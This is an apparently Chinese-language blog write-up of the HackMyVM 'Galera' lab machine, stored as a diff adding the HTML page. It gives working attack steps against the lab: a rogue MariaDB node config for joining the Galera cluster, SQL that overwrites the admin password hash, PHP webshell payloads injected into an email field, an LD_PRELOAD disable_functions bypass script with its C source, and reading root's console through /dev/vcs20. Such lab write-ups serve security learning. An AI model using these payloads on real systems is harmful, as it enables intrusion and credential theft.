@@ -1,0 +1,255 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>hackmyvm_Galera | myift</title><meta name="author" content="dgh"><meta name="copyright" content="dgh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="发现了一个4567端口比较奇怪根据靶机名猜到是Galera集群 其特点如下: 同步复制主动且多主的拓扑读写任意节点自动的成员资格控制，失效的成员会自动剔除节点自动加入row级别的并行复制各节点可供客户端直接连接      php配置文件泄露  过滤了很多命令 80端口web服务爆破失败 我们尝试加入Galera集群已同步得到器数据库信息及操作权限  目标操作系统是 Debian 12 “Boo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hackmyvm_Galera">
+<meta property="og:url" content="http://example.com/2025/07/23/hackmyvm-Galera/index.html">
+<meta property="og:site_name" content="myift">
+<meta property="og:description" content="发现了一个4567端口比较奇怪根据靶机名猜到是Galera集群 其特点如下: 同步复制主动且多主的拓扑读写任意节点自动的成员资格控制，失效的成员会自动剔除节点自动加入row级别的并行复制各节点可供客户端直接连接      php配置文件泄露  过滤了很多命令 80端口web服务爆破失败 我们尝试加入Galera集群已同步得到器数据库信息及操作权限  目标操作系统是 Debian 12 “Boo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/png.png">
+<meta property="article:published_time" content="2025-07-23T02:54:37.000Z">
+<meta property="article:modified_time" content="2025-07-23T02:57:10.358Z">
+<meta property="article:author" content="dgh">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/png.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "hackmyvm_Galera",
+  "url": "http://example.com/2025/07/23/hackmyvm-Galera/",
+  "image": "http://example.com/image/png.png",
+  "datePublished": "2025-07-23T02:54:37.000Z",
+  "dateModified": "2025-07-23T02:57:10.358Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "dgh",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/07/23/hackmyvm-Galera/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'hackmyvm_Galera',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/png.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/png1.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">myift</span></a><a class="nav-page-title" href="/"><span class="site-name">hackmyvm_Galera</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">hackmyvm_Galera</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-23T02:54:37.000Z" title="发表于 2025-07-23 10:54:37">2025-07-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-23T02:57:10.358Z" title="更新于 2025-07-23 10:57:10">2025-07-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><img src="/../imgs/$%7Bfiilename%7D/image-20250709102451786.png" alt="image-20250709102451786"></p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250709105409028.png" alt="image-20250709105409028"></p>
+<p>发现了一个4567端口比较奇怪根据靶机名猜到是Galera集群</p>
+<p>其特点如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同步复制</span><br><span class="line">主动且多主的拓扑</span><br><span class="line">读写任意节点</span><br><span class="line">自动的成员资格控制，失效的成员会自动剔除</span><br><span class="line">节点自动加入</span><br><span class="line">row级别的并行复制</span><br><span class="line">各节点可供客户端直接连接</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250709105423064.png" alt="image-20250709105423064"></p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250709105437079.png" alt="image-20250709105437079"></p>
+<p>php配置文件泄露</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250709165019501.png" alt="image-20250709165019501"></p>
+<p>过滤了很多命令</p>
+<p>80端口web服务爆破失败</p>
+<p>我们尝试加入Galera集群已同步得到器数据库信息及操作权限</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250709170040842.png" alt="image-20250709170040842"></p>
+<p>目标操作系统是 Debian 12 “Bookworm”Debian12, 默认仓库中的 MariaDB 版本是 10.11.11</p>
+<p>为了防止集群同步过程出现问题我们也是用相同版本的MariaDB去伪装节点加入集群</p>
+<p>创建节点docker配置结构如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose.yml</span><br><span class="line">version: &quot;3.9&quot;  # Docker Compose 文件格式版本</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  galera-atacante:</span><br><span class="line">    image: mariadb:10.11.11  # 使用官方 MariaDB 镜像，带 Galera 支持</span><br><span class="line">    container_name: galera-atacante  # 容器名称固定为 galera-atacante</span><br><span class="line">    network_mode: host  # 使用宿主机网络（必要条件，避免 SST 时端口问题）</span><br><span class="line">    environment:</span><br><span class="line">      - MARIADB_ALLOW_EMPTY_ROOT_PASSWORD=yes  # 允许 root 用户密码为空（仅限开发环境使用）</span><br><span class="line">      - MARIADB_ROOT_PASSWORD=  # 明确设置空密码（与上面一起使用）</span><br><span class="line">      - WSREP_SST_METHOD=rsync  # 设置 SST（状态快照传输）方法为 rsync</span><br><span class="line">    volumes:</span><br><span class="line">      - ./conf.d:/etc/mysql/conf.d:ro  # 将主机当前目录下的 conf.d 挂载到容器配置目录中（只读）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conf.d/galera.cnf</span><br><span class="line">[mysqld]  # 推荐使用 [mysqld] 段名以确保所有版本兼容</span><br><span class="line"></span><br><span class="line"># 启用 Galera 插件</span><br><span class="line">wsrep_on=ON</span><br><span class="line"></span><br><span class="line"># Galera 插件库路径（MariaDB 官方镜像中默认路径）</span><br><span class="line">wsrep_provider=/usr/lib/galera/libgalera_smm.so</span><br><span class="line"></span><br><span class="line"># 集群种子节点地址：</span><br><span class="line"># - 第一个节点启动时可以写 gcomm://</span><br><span class="line"># - 后续节点写入要连接的现有节点 IP</span><br><span class="line">wsrep_cluster_address=gcomm://192.168.56.107</span><br><span class="line"></span><br><span class="line"># 当前节点绑定的 IP 地址（用于其他节点连接此节点）</span><br><span class="line">wsrep_node_address=192.168.56.103</span><br><span class="line"></span><br><span class="line"># 当前节点的名称（任意命名，用于日志和识别）</span><br><span class="line">wsrep_node_name=atacante</span><br><span class="line"></span><br><span class="line"># Galera 所要求的必要配置项</span><br><span class="line">binlog_format=ROW                 # 使用 ROW 格式二进制日志（必须）</span><br><span class="line">default_storage_engine=InnoDB    # Galera 仅支持 InnoDB 引擎</span><br><span class="line">innodb_autoinc_lock_mode=2       # 设置自增锁模式，避免多节点插入冲突</span><br><span class="line"></span><br><span class="line"># 设置 SST 方法（状态快照传输）</span><br><span class="line"># rsync 是最简单的方式，适合测试环境</span><br><span class="line">wsrep_sst_method=rsync</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250709204759146.png" alt="image-20250709204759146"></p>
+<p>docker去拉取MariaDB 镜像</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250709203759561.png" alt="image-20250709203759561"></p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250709203909347.png" alt="image-20250709203909347"></p>
+<p>已经成功加入集群</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; SHOW DATABASES</span><br><span class="line">    -&gt; ;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| galeradb           |</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows in set (0.002 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; SHOW TABLES IN galeradb;</span><br><span class="line">+--------------------+</span><br><span class="line">| Tables_in_galeradb |</span><br><span class="line">+--------------------+</span><br><span class="line">| users              |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.001 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [galeradb]&gt; use galeradb;</span><br><span class="line">Database changed</span><br><span class="line">MariaDB [galeradb]&gt; select * from users;</span><br><span class="line">+----+----------+------------------+--------------------------------------------------------------+---------------------+</span><br><span class="line">| id | username | email            | password                                                     | created_at          |</span><br><span class="line">+----+----------+------------------+--------------------------------------------------------------+---------------------+</span><br><span class="line">|  1 | admin    | admin@galera.hmv | $2y$10$BCAQ6VSNOL9TzfE5/dnVmuc9R5PotwClWAHwRdRAt7RM0d9miJRzq | 2025-05-04 23:55:51 |</span><br><span class="line">+----+----------+------------------+--------------------------------------------------------------+---------------------+</span><br><span class="line">1 row in set (0.003 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [galeradb]&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个md5一直爆不出来我们搞清楚加密方式之后直接重新改写密码即可</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250709215208420.png" alt="image-20250709215208420"></p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250709215536956.png" alt="image-20250709215536956"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update users set password = &quot;$2a$12$CkewrEGSS7dLbfapvfJVl.Jloq9WKR9bdRlYk6Thx2m/D7mXKE522&quot; where id = 1 ;</span><br></pre></td></tr></table></figure>
+
+<p>修改完直接admin&#x2F;admin登陆即可</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250714110841219.png" alt="image-20250714110841219"></p>
+<p>这里发布消息之后我们进行查看但是不会解析</p>
+<p><strong><img src="/../imgs/$%7Bfiilename%7D/image-20250714111415909.png" alt="image-20250714111415909"></strong></p>
+<p>这个页面还有一个可控的点就是email</p>
+<p>我们直接去修改email</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250714112105399.png" alt="image-20250714112105399"></p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250714112126273.png" alt="image-20250714112126273"></p>
+<p>可以上传文件可以设计LD_PRELOAD劫持来进行命令执行拿到shell</p>
+<p>原理:<code>LD_PRELOAD</code> 的作用是注入一个你自己写的 <code>.so</code> 动态链接库，它<strong>在操作系统层面</strong>生效，直接与底层 glibc（C 标准库）交互，因此<strong>绕过了 PHP 在脚本层面对函数的禁用控制</strong>。</p>
+<p> 先整一个文件上传</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE users SET email=&quot;&lt;?php file_put_contents($_POST[&#x27;a&#x27;],base64_decode($_POST[&#x27;b&#x27;]));?&gt;&quot; WHERE username=&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后上传典型的 利用 <code>LD_PRELOAD</code> 绕过 <code>disable_functions</code> 实现命令执行的后门脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    // 输出一个示例 URL，说明该脚本的使用方法</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    // 获取要执行的命令，如 cmd=pwd</span><br><span class="line">    $cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line"></span><br><span class="line">    // 获取命令输出保存路径，如 outpath=/tmp/xx</span><br><span class="line">    $out_path = $_GET[&quot;outpath&quot;];</span><br><span class="line"></span><br><span class="line">    // 构造完整的命令行，将输出重定向到指定路径</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line"></span><br><span class="line">    // 输出构造后的命令行（用于调试或提示）</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    // 将构造的命令写入自定义环境变量 EVIL_CMDLINE</span><br><span class="line">    // 该变量将在 LD_PRELOAD 注入的 .so 文件中读取并执行</span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">    // 获取 .so 文件路径，如 sopath=/var/www/bypass_disablefunc_x64.so</span><br><span class="line">    $so_path = $_GET[&quot;sopath&quot;];</span><br><span class="line"></span><br><span class="line">    // 设置 LD_PRELOAD 环境变量为恶意 .so 的路径</span><br><span class="line">    // 这样下次触发 libc 函数调用时，该 .so 会被自动加载</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line"></span><br><span class="line">    // 触发 libc 层的函数调用，通常用 mail() 或 error_log()</span><br><span class="line">    // 此调用会导致系统调用 send() 等 libc 函数，从而触发 LD_PRELOAD 加载 .so</span><br><span class="line">    error_log(&#x27;123&#x27;, 1, &#x27;test@qq.com&#x27;, &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">    // 下面两行是可选：</span><br><span class="line">    // 读取命令执行输出结果并展示在网页上（被注释掉）</span><br><span class="line">    // echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    // 删除输出文件，清理痕迹（被注释掉）</span><br><span class="line">    // unlink($out_path);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">    $out_path = $_GET[&quot;outpath&quot;];</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br><span class="line">    $so_path = $_GET[&quot;sopath&quot;];</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line">    error_log(&#x27;123&#x27;,1,&#x27;test@qq.com&#x27;,&#x27;&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>这一个能传上去</p>
+<p>再写一个要利用用的<code>.so</code> 文件</p>
+<p>e.so就是<a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E9%87%8C%E9%9D%A2%E7%9A%84x64%E7%9A%84so%E6%96%87%E4%BB%B6">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD这个项目里面的x64的so文件</a></p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250714213617939.png" alt="image-20250714213617939"></p>
+<p>base64编码后上传</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void __attribute__((constructor)) init() &#123;</span><br><span class="line">    char *cmd = getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line">    if (cmd != NULL) &#123;</span><br><span class="line">        system(cmd); // 执行命令</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>最终没有拿到shell不知道怎么解决so文件base上传再编码之后和源文件不一致怎么解决</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE users SET email=&#x27;&lt;?php include(&quot;/etc/passwd&quot;); ?&gt;&#x27; WHERE username=&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250714112846741.png" alt="image-20250714112846741"></p>
+<p>发现纯在用户donjuandeaustria</p>
+<p>直接爆破密码</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250719140829608.png" alt="image-20250719140829608"></p>
+<p>成功爆破出密码为amorcito</p>
+<p>有一张图片</p>
+<p>传出来做一下检查</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250719143913830.png" alt="image-20250719143913830"></p>
+<p>就单纯是一张图片</p>
+<p>什么都没有</p>
+<p>可能是提示下面是兔子洞</p>
+<p>linpeas.sh扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">╔══════════╣ Analyzing Autologin Files (limit 70)</span><br><span class="line">                                                                                                                                                                                                                   </span><br><span class="line">-rw-r--r-- 1 root root 81 May  7 21:45 /etc/systemd/system/getty@tty20.service.d/autologin.conf</span><br><span class="line">[Service]</span><br><span class="line">ExecStart=</span><br><span class="line">ExecStart=-/sbin/agetty --autologin root --noclear %I $TERM</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">donjuandeaustria@galera:~$ who                                                                                                                                                                                     </span><br><span class="line">root     tty20        2025-07-18 22:46                                                                                                                                                                             </span><br><span class="line">donjuandeaustria pts/0        2025-07-19 02:08 (192.168.56.103)                                                                                                                                                    </span><br><span class="line">donjuandeaustria@galera:~$ users                                                                                                     </span><br><span class="line">donjuandeaustria root                                                                                                                                                                                         </span><br><span class="line">donjuandeaustria@galera:~$    </span><br><span class="line">donjuandeaustria@galera:/dev$ w</span><br><span class="line"> 03:51:41 up  5:05,  2 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">root     tty20    -                22:46    5:05m  0.03s  0.01s -bash</span><br><span class="line">donjuand pts/0    192.168.56.103   02:08    1.00s  0.04s   ?    w</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这就很明显知道两个终端而且 tty20肯定是root用户</p>
+<p>都属于tty组我们直接查看root所在终端的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /dev/vcs20或者cat /dev/vcsa20就能看到root用户虚拟终端上的内容：</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250719154906430.png" alt="image-20250719154906430"></p>
+<p>能看到root的密码</p>
+<p>直接root登陆即可</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">dgh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/07/23/hackmyvm-Galera/">http://example.com/2025/07/23/hackmyvm-Galera/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">myift</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/image/png.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/05/29/hackmyvm-todd/" title="hackmyvm_todd"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">hackmyvm_todd</div></div><div class="info-2"><div class="info-item-1">先寻找靶机 arp-scan -I eth1 192.168.56.0/24   再次扫描其开放的服务 nmap -A -p- 192.168.56.104     22,80和一个特殊的7066端口  目录扫描得到一个目录访问目录可知 其含有一些用得上的脚本  尝试连接7066发现直接给了个shell在自己目录下得到userflag  然后就很明显了进行提权 但是我们当前这个shell连上很快就会断掉没法操作 所以我们尝试ssh登录 生成密钥ssh-keygen -t rsa -f todd   公钥放到用户目录的.ssh目录下 cd .sshecho &quot;ssh-rsa...</div></div></div></a><a class="pagination-related" href="/2025/07/23/hackmyvm-runas/" title="hackmyvm_runas"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">hackmyvm_runas</div></div><div class="info-2"><div class="info-item-1"> ┌──(root㉿kali)-[/myift/bachang/win/runas]└─# arp-scan -I eth1 192.168.56.0/24Interface: eth1, type: EN10MB, MAC: 00:0c:29:96:80:36, IPv4: 192.168.56.103Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.56.1    0a:00:27:00:00:0e       (Unknown: locally administered)192.168.56.100  08:00:27:81:30:5f       PCS Systemtechnik GmbH192.168.56.109  08:00:27:56:13:ce       PCS Systemtechnik GmbH3 packets received by filter, 0 packets dropped by kernelEnding...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/png.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">dgh</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/23/hackmyvm-quoted/" title="hackmyvm_quoted">hackmyvm_quoted</a><time datetime="2025-07-23T02:55:21.000Z" title="发表于 2025-07-23 10:55:21">2025-07-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/23/hackmyvm-nessus/" title="hackmyvm_nessus">hackmyvm_nessus</a><time datetime="2025-07-23T02:55:06.000Z" title="发表于 2025-07-23 10:55:06">2025-07-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/23/hackmyvm-runas/" title="hackmyvm_runas">hackmyvm_runas</a><time datetime="2025-07-23T02:54:56.000Z" title="发表于 2025-07-23 10:54:56">2025-07-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/23/hackmyvm-Galera/" title="hackmyvm_Galera">hackmyvm_Galera</a><time datetime="2025-07-23T02:54:37.000Z" title="发表于 2025-07-23 10:54:37">2025-07-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-todd/" title="hackmyvm_todd">hackmyvm_todd</a><time datetime="2025-05-29T13:29:17.000Z" title="发表于 2025-05-29 21:29:17">2025-05-29</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By dgh</div><div 